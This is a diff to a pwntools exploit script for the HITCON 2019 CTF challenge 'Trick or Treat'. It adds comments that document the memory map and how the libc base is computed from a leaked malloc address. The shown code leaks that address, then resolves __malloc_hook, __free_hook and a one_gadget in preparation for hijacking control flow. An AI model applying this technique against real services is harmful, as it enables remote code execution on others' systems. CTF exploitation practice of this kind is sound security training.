@@ -19,9 +19,14 @@ def trick_or_treat(DEBUG):
 		r = remote(HOST,PORT) # remote expoit
 
 	r.sendlineafter("Size:","100000000")
+	"""
+	magic = malloc(100000000) = 0x7ffff1a85010
+	0x7ffff1a85000     0x7ffff79e4000 rw-p  5f5f000 0
+    0x7ffff79e4000     0x7ffff7bcb000 r-xp   1e7000 0      /home/phieulang/ctf/2019/HITCON/trick/libc.so.6
+	"""
 	r.recvuntil("Magic:")
 	addr = int(r.recvuntil("\n").strip(),16)
-	libc = addr + 0x5f5eff0
+	libc = addr + 0x5f5eff0 # 0x7ffff79e4000 (libc) - 0x7ffff1a85010 (magic) = 0x5f5eff0
 	__malloc_hook = libc +libc_file.symbols["__malloc_hook"]
 	__free_hook = libc + libc_file.symbols["__free_hook"]
 	one_gadget = libc + 0x10a38c # fail with remote environment
